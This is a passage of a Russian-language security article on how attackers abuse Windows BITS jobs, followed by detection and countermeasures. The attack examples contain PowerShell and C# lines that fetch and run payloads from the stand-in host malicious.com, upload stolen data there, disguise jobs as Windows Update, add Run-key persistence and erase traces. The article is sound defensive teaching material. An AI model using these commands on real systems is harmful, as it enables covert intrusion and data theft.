        техника особенно опасна, так как BITS работает в фоновом режиме и использует системные процессы, что затрудняет
        её обнаружение.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Кейсы реальных атак
  </h2>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Пример 1: Многоэтапная атака с использованием BITS для
            загрузки и выполнения вредоносного ПО
  </h3>
 </div>
 <p dir="auto">
  <strong>
   Шаги злоумышленников:
  </strong>
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Создание задания для загрузки вредоносного загрузчика
    </strong>
    :
    <br/>
    Злоумышленник создаёт задание BITS для загрузки небольшого загрузчика, который затем скачивает основной
                вредоносный файл.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c"><span class="pl-c">#</span> Загрузка загрузчика</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://malicious.com/loader.exe<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\loader.exe<span class="pl-pds">"</span></span>
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()</pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Запуск загрузчика для загрузки основного вредоносного файла
    </strong>
    :
    <br/>
    После завершения загрузки загрузчик запускается и скачивает основной вредоносный файл.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">Start-Process</span> <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\loader.exe<span class="pl-pds">"</span></span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Сокрытие активности
    </strong>
    :
    <br/>
    После выполнения загрузчика задание BITS удаляется, чтобы скрыть следы.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJob <span class="pl-smi">$job</span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Установка устойчивости
    </strong>
    :
    <br/>
    Основной вредоносный файл добавляется в автозагрузку для обеспечения устойчивости.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">Set-ItemProperty</span> <span class="pl-k">-</span>Path <span class="pl-s"><span class="pl-pds">"</span>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">"</span>MaliciousApp<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Value <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\malware.exe<span class="pl-pds">"</span></span></pre>
   </div>
  </li>
 </ol>
 <p dir="auto">
  <strong>
   Анализ:
  </strong>
 </p>
 <ul dir="auto">
  <li>
   <strong>
    Цель
   </strong>
   : Загрузка и выполнение вредоносного ПО через многоэтапный процесс.
  </li>
  <li>
   <strong>
    Методы сокрытия
   </strong>
   : Удаление задания BITS и использование загрузчика для минимизации
            подозрений.
  </li>
  <li>
   <strong>
    Рекомендации по защите
   </strong>
   : Мониторинг активности BITS и проверка автозагрузки на наличие
            подозрительных записей.
  </li>
 </ul>
 <hr/>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Пример 2: Использование BITS для передачи данных с
            заражённой системы
  </h3>
 </div>
 <p dir="auto">
  <strong>
   Шаги злоумышленников:
  </strong>
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Создание задания для отправки данных
    </strong>
    :
    <br/>
    Злоумышленник использует BITS для отправки украденных данных на удалённый сервер.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>C:\SensitiveData\stolen_data.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>https://malicious.com/upload<span class="pl-pds">"</span></span>
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()</pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Маскировка задания
    </strong>
    :
    <br/>
    Задание получает описание, похожее на системное, чтобы избежать подозрений.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-smi">$job<span class="pl-smi">.Description</span></span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>Windows Update Data Sync<span class="pl-pds">"</span></span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Автоматическое возобновление передачи
    </strong>
    :
    <br/>
    Если передача прерывается, задание автоматически возобновляется благодаря встроенным функциям BITS.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Удаление задания после завершения
    </strong>
    :
    <br/>
    После успешной передачи данных задание удаляется.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJob <span class="pl-smi">$job</span></pre>
   </div>
  </li>
 </ol>
 <p dir="auto">
  <strong>
   Анализ:
  </strong>
 </p>
 <ul dir="auto">
  <li>
   <strong>
    Цель
   </strong>
   : Передача украденных данных с минимальным риском обнаружения.
  </li>
  <li>
   <strong>
    Методы сокрытия
   </strong>
   : Маскировка задания под системное и автоматическое удаление после
            завершения.
  </li>
  <li>
   <strong>
    Рекомендации по защите
   </strong>
   : Регулярный аудит заданий BITS и мониторинг сетевого трафика.
  </li>
 </ul>
 <hr/>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Пример 3: Использование BITS для цепной атаки через API
  </h3>
 </div>
 <p dir="auto">
  <strong>
   Шаги злоумышленников:
  </strong>
 </p>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Создание задания через BITS API
    </strong>
    :
    <br/>
    Злоумышленник использует BITS API для создания задания, которое скачивает скрипт PowerShell с удалённого
                сервера.
   </p>
   <div class="highlight highlight-source-cs notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-k">using</span> <span class="pl-s1">System</span><span class="pl-kos">;</span>
    <span class="pl-k">using</span> <span class="pl-s1">Bits</span><span class="pl-kos">;</span>
    
    <span class="pl-k">class</span> <span class="pl-smi">ChainAttack</span>
    <span class="pl-kos">{</span>
        <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-en">Main</span><span class="pl-kos">(</span><span class="pl-kos">)</span>
        <span class="pl-kos">{</span>
            <span class="pl-k">var</span> <span class="pl-s1">manager</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">BackgroundCopyManager</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
            <span class="pl-smi">IBackgroundCopyJob</span> <span class="pl-s1">job</span><span class="pl-kos">;</span>
    
            <span class="pl-c">// Создание задания BITS</span>
            <span class="pl-s1">manager</span><span class="pl-kos">.</span><span class="pl-en">CreateJob</span><span class="pl-kos">(</span><span class="pl-s">"ChainAttackJob"</span><span class="pl-kos">,</span> <span class="pl-s1">BG_JOB_TYPE</span><span class="pl-kos">.</span><span class="pl-s1">BG_JOB_TYPE_DOWNLOAD</span><span class="pl-kos">,</span> <span class="pl-k">out</span> <span class="pl-s1">job</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
            <span class="pl-s1">job</span><span class="pl-kos">.</span><span class="pl-en">AddFile</span><span class="pl-kos">(</span><span class="pl-s">"https://malicious.com/payload.ps1"</span><span class="pl-kos">,</span> <span class="pl-s">@"C:\Temp\payload.ps1"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
            <span class="pl-s1">job</span><span class="pl-kos">.</span><span class="pl-en">Resume</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    
            <span class="pl-s1">Console</span><span class="pl-kos">.</span><span class="pl-en">WriteLine</span><span class="pl-kos">(</span><span class="pl-s">"Скрипт PowerShell загружен."</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
        <span class="pl-kos">}</span>
    <span class="pl-kos">}</span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Выполнение загруженного скрипта
    </strong>
    :
    <br/>
    После завершения загрузки скрипт PowerShell выполняется для выполнения дальнейших действий.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">powershell.exe</span> <span class="pl-k">-</span>ExecutionPolicy Bypass <span class="pl-k">-</span>File <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\payload.ps1<span class="pl-pds">"</span></span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Дальнейшие действия скрипта
    </strong>
    :
    <br/>
    Скрипт PowerShell может:
   </p>
   <ul dir="auto">
    <li>
     Скачивать дополнительные модули.
    </li>
    <li>
     Выполнять команды на заражённой системе.
    </li>
    <li>
     Устанавливать устойчивость.
    </li>
   </ul>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Удаление задания и временных файлов
    </strong>
    :
    <br/>
    После выполнения скрипта задание и временные файлы удаляются.
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJob <span class="pl-smi">$job</span>
    <span class="pl-c1">Remove-Item</span> <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\payload.ps1<span class="pl-pds">"</span></span></pre>
   </div>
  </li>
 </ol>
 <p dir="auto">
  <strong>
   Анализ:
  </strong>
 </p>
 <ul dir="auto">
  <li>
   <strong>
    Цель
   </strong>
   : Выполнение цепной атаки с использованием BITS API и PowerShell.
  </li>
  <li>
   <strong>
    Методы сокрытия
   </strong>
   : Удаление временных файлов и задания после выполнения.
  </li>
  <li>
   <strong>
    Рекомендации по защите
   </strong>
   : Ограничение доступа к BITS API и мониторинг выполнения скриптов
            PowerShell.
  </li>
 </ul>
 <hr/>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Преимущества атак через BITS Jobs
  </h2>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Незаметность для стандартных антивирусов
    </strong>
    :
    <br/>
    Поскольку BITS работает через системные процессы, такие как
    <code>
     svchost.exe
    </code>
    , его активность
                часто не вызывает подозрений у стандартных антивирусных решений. Это позволяет злоумышленникам скрывать
                свои действия.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Аутентификация и управление через API
    </strong>
    :
    <br/>
    BITS предоставляет мощный API, который позволяет злоумышленникам создавать, управлять и контролировать
                задания. Если у атакующего есть доступ к системе, он может использовать этот API для выполнения своих
                задач без необходимости использования дополнительных инструментов.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Автоматическое возобновление
    </strong>
    :
    <br/>
    Задания BITS автоматически возобновляются после сбоев, таких как перезагрузка системы или временные
                проблемы с сетью. Это делает атаки более устойчивыми и сложными для обнаружения.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Гибкость в настройке
    </strong>
    :
    <br/>
    Возможность задавать приоритеты, ограничения скорости и другие параметры позволяет злоумышленникам
                адаптировать атаки под конкретные условия, минимизируя вероятность обнаружения.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Методы обнаружения и противодействия
  </h1>
 </div>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Обнаружение атак
  </h2>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Анализ логов системы Windows
    </strong>
    :
    <br/>
    Логи Windows могут содержать информацию о создании и выполнении заданий BITS. Используйте Event Viewer
                для анализа событий, связанных с BITS, например, в разделе "Applications and Services Logs &gt;
                Microsoft &gt; Windows &gt; Bits-Client".
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Настройка средств мониторинга сетевого трафика
    </strong>
    :
    <br/>
    Инструменты мониторинга, такие как Wireshark или Zeek, могут помочь обнаружить подозрительные
                подключения к неизвестным доменам или IP-адресам, используемым для загрузки вредоносных файлов.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Использование специализированных инструментов (например, Sysmon)
    </strong>
    :
    <br/>
    Sysmon позволяет отслеживать создание процессов, сетевые подключения и изменения в системе. Настройте
                Sysmon для мониторинга активности, связанной с
    <code>
     svchost.exe
    </code>
    и заданиями BITS.
   </p>
   <p dir="auto">
    Пример конфигурации Sysmon для мониторинга BITS:
   </p>
   <div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto">
    <pre>&lt;<span class="pl-ent">RuleGroup</span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>BITS Monitoring<span class="pl-pds">"</span></span> <span class="pl-e">groupRelation</span>=<span class="pl-s"><span class="pl-pds">"</span>or<span class="pl-pds">"</span></span>&gt;
        &lt;<span class="pl-ent">ProcessCreate</span> <span class="pl-e">onmatch</span>=<span class="pl-s"><span class="pl-pds">"</span>include<span class="pl-pds">"</span></span>&gt;
            &lt;<span class="pl-ent">Image</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>contains<span class="pl-pds">"</span></span>&gt;svchost.exe&lt;/<span class="pl-ent">Image</span>&gt;
            &lt;<span class="pl-ent">CommandLine</span> <span class="pl-e">condition</span>=<span class="pl-s"><span class="pl-pds">"</span>contains<span class="pl-pds">"</span></span>&gt;bitsadmin&lt;/<span class="pl-ent">CommandLine</span>&gt;
        &lt;/<span class="pl-ent">ProcessCreate</span>&gt;
    &lt;/<span class="pl-ent">RuleGroup</span>&gt;</pre>
   </div>
  </li>
 </ol>
 <hr/>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Противодействие
  </h2>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Настройка групповой политики для ограничения BITS Jobs
    </strong>
    :
    <br/>
    Используйте Group Policy Editor для ограничения доступа к BITS API. Например, можно запретить выполнение
    <code>
     bitsadmin.exe
    </code>
    для определённых пользователей или групп.
   </p>
   <p dir="auto">
    <strong>
     Пример настройки:
    </strong>
   </p>
   <ol dir="auto">
    <li>
     Откройте редактор групповой политики (Group Policy Editor), выполнив команду
     <code>
      gpedit.msc
     </code>
     .
    </li>
    <li>
     Перейдите в раздел:
     <br/>
     <code>
      User Configuration &gt; Administrative Templates &gt; System
     </code>
     .
    </li>
    <li>
     Найдите параметр
     <strong>
      "Don't run specified Windows applications"
     </strong>
     (Не запускать указанные
                    приложения Windows).
    </li>
    <li>
     Включите этот параметр и добавьте
     <code>
      bitsadmin.exe
     </code>
     в список запрещённых приложений.
    </li>
    <li>
     Нажмите
     <strong>
      OK
     </strong>
     для сохранения изменений.
    </li>
   </ol>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Удаление задач BITS вручную через PowerShell или командную строку
    </strong>
    :
    <br/>
    Вы можете вручную удалить подозрительные задания BITS с помощью PowerShell:
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c"><span class="pl-c">#</span> Получение списка всех заданий BITS</span>
    <span class="pl-c1">Get-BitsTransfer</span>
    
    <span class="pl-c"><span class="pl-c">#</span> Удаление подозрительного задания</span>
    <span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJobId <span class="pl-k">&lt;</span>JobId<span class="pl-k">&gt;</span></pre>
   </div>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Автоматизация защиты с использованием скриптов
    </strong>
    :
    <br/>
    Создайте скрипт для регулярного мониторинга и удаления подозрительных заданий. Например:
   </p>
   <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
    <pre><span class="pl-c"><span class="pl-c">#</span> Скрипт для удаления заданий с подозрительными описаниями</span>
    <span class="pl-smi">$jobs</span> <span class="pl-k">=</span> <span class="pl-c1">Get-BitsTransfer</span>
    <span class="pl-k">foreach</span> (<span class="pl-smi">$job</span> <span class="pl-k">in</span> <span class="pl-smi">$jobs</span>) {
        <span class="pl-k">if</span> (<span class="pl-smi">$job<span class="pl-smi">.Description</span></span> <span class="pl-k">-like</span> <span class="pl-s"><span class="pl-pds">"</span>*malicious*<span class="pl-pds">"</span></span>) {
            <span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJob <span class="pl-smi">$job</span>
            <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Удалено подозрительное задание: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-smi">$job<span class="pl-smi">.DisplayName</span></span><span class="pl-pse">)</span><span class="pl-pds">"</span></span>
        }
    }</pre>
   </div>
  </li>
 </ol>
 <hr/>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Примеры инструментов
  </h2>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Антивирусные решения и EDR-системы для обнаружения угроз
    </strong>
    :
    <br/>
    Современные антивирусы и EDR-системы (Endpoint Detection and Response), такие как Microsoft Defender
                ATP, CrowdStrike или SentinelOne, могут обнаруживать и блокировать подозрительную активность, связанную
                с BITS.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Утилиты для анализа BITS Jobs
    </strong>
    :
   </p>
   <ul dir="auto">
    <li>
     <strong>
      BitsAdmin
     </strong>
     : Командная утилита для управления заданиями BITS.
     <br/>
     Пример использования:
     <div class="highlight highlight-source-batchfile notranslate position-relative overflow-auto" dir="auto">
      <pre><span class="pl-k">bitsadmin</span> /list /allusers</pre>
     </div>
    </li>
    <li>
     <strong>
      PowerShell
     </strong>
     : Инструмент для управления и анализа заданий BITS.
     <br/>
     Пример:
     <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
      <pre><span class="pl-c1">Get-BitsTransfer</span> <span class="pl-k">|</span> <span class="pl-c1">Format-Table</span> <span class="pl-k">-</span>Property DisplayName<span class="pl-k">,</span> Description<span class="pl-k">,</span> State</pre>
     </div>
    </li>
    <li>
     <strong>
      Sysinternals Suite
     </strong>
     : Набор инструментов, таких как Process Monitor, для анализа
                    активности процессов, связанных с BITS.
    </li>
   </ul>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Заключение
  </h1>
 </div>
 <p dir="auto">
  Background Intelligent Transfer Service (BITS) — мощный инструмент для передачи данных, который широко
        используется в легитимных целях. Однако его возможности могут быть использованы злоумышленниками для выполнения
        атак. Понимание работы BITS, методов злоупотребления и способов защиты позволяет программистам и специалистам по
        безопасности эффективно предотвращать угрозы. Совместная работа разработчиков и безопасников, а также
        использование современных инструментов мониторинга и защиты помогут минимизировать риски, связанные с
        использованием BITS.
 </p>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Ссылки
  </h1>
 </div>
 <ol dir="auto">
  <li>
   <a href="https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal" rel="nofollow">
    Официальная документация Microsoft по BITS
   </a>
  </li>
  <li>
   <a href="https://attack.mitre.org/techniques/T1197/" rel="nofollow">
    MITRE ATT&amp;CK: Техника T1197 (BITS
                Jobs)
   </a>
  </li>
  <li>
   <a href="https://learn.microsoft.com/en-us/sysinternals/" rel="nofollow">
    Sysinternals Suite
   </a>
  </li>
  <li>
   <a href="https://learn.microsoft.com/en-us/powershell/module/bitstransfer/" rel="nofollow">
    Документация
                PowerShell по BITS
   </a>
  </li>
  <li>
   <a href="https://www.sans.org/white-papers/" rel="nofollow">
    Исследование злоупотреблений BITS в
                кибербезопасности
   </a>
  </li>
  <li>
   <a href="https://www.wireshark.org/" rel="nofollow">
    Wireshark: Анализ сетевого трафика
   </a>
  </li>
  <li>
   <a href="https://zeek.org/" rel="nofollow">
    Zeek: Мониторинг сетевой активности
   </a>
  </li>
 </ol>
</article>
